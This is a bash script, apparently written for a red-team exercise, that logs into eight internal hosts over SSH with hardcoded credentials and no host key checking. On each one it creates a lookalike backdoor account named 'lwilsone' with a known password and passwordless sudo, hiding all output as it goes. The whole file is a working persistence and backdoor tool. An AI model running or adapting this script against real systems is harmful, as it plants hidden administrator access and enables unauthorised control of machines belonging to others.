#!/bin/bash

TARGETS=(
    "10.10.10.102"
    "10.10.10.103"
    "10.10.10.104"
    "10.10.10.105"
    "10.10.10.106"
    "10.10.10.107"
    "10.10.10.108"
    "10.10.10.109"
)

USERNAME="lwilson@cdt.local"
PASSWORD="RedTeamrules123"

if ! command -v sshpass &> /dev/null; then
    sudo apt-get update && sudo apt-get install -y sshpass >/dev/null 2>&1
fi

for TARGET in "${TARGETS[@]}"; do
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$USERNAME@$TARGET" << 'ENDSSH' >/dev/null 2>&1
sudo useradd -m -s /bin/bash lwilsone 2>/dev/null
echo "lwilsone:RedTeamrules123" | sudo chpasswd
echo "lwilsone ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/lwilsone > /dev/null
sudo chmod 440 /etc/sudoers.d/lwilsone
ENDSSH

    if [ $? -eq 0 ]; then
        echo "$TARGET: User created"
    fi
done